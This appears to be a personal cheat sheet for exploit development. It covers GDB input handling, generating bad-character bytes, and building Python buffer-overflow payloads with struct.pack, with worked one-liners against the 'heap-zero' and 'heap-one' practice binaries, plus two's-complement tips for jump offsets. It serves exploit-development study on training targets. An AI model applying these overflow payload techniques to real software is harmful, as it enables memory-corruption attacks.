
# GDB multiple inputs ===========================================================
```
gdb$ r < <(cat 1_intest.txt 2_intest.txt)

gdb --args executablename arg1 arg2 arg3
```

# Getting bad characters ========================================================

[Give all characters and see what when through]:
```
all_characters = b"".join([ struct.pack("<B",x) for x in range(1, 256) ])
```

# Exploit Development w/ Python3 ================================================

[Use b'' for string values]: b'' (such as b'A')

- - - - - - - - - - - - - - - - - - - - - - -

[For large payloads, use b''.join([payload])]: payload=b''.join([b'A'*100+struct.pack('<I',0x08048835)])

- - - - - - - - - - - - - - - - - - - - - - -

[Use _this_ instead of print()]: sys.stdout.buffer.write(payload)

- - - - - - - - - - - - - - - - - - - - - - -

[Example 1]:
``` PYTHON 2
./heap-zero $(python -c "import struct; print 'A'*72 + struct.pack('<I',0x08048835)")
```
``` PYTHON 3
./heap-zero $(python3 -c "import struct; import sys; sys.stdout.buffer.write(b'A'*72 + struct.pack('<I',0x08048835))")
```

[Example 2]:
``` PYTHON 2
./heap-one $(python -c "import struct; print('A'*20 + struct.pack('<I',0x0804c140))") $(python -c "import struct; print(struct.pack('<I',0x0804889a))")
```
``` PYTHON 3
./heap-one $(python3 -c "import struct; import sys; sys.stdout.buffer.write(b'A'*20 + struct.pack('<I',0x0804c140))") $(python3 -c "import struct; import sys; sys.stdout.buffer.write(struct.pack('<I',0x0804889a))")
```

- - - - - - - - - - - - - - - - - - - - - - -

# ===========================================================

# TIPS AND TRICKS

## TWO'S COMPLEMENT TO GET NEGATIVE NUMBER IN HEX
+ Let's say we wan't -70
+ 2’s complement = (<jump_distannce> ^ 0xff) + 1

[Python Template]: hex( ( <jump_distance> ^ 0xff) + 1 )
[Python Example]:  hex( (70 ^ 0xff) + 1 )

## 2's compliment that fit into 1 byte
##  smallest 1byte/8bit negative number is -128
```
>>> hex((70 ^ 0xff) + 1)
'0xba'
>>> hex((128 ^ 0xff) + 1)
'0x80'
```

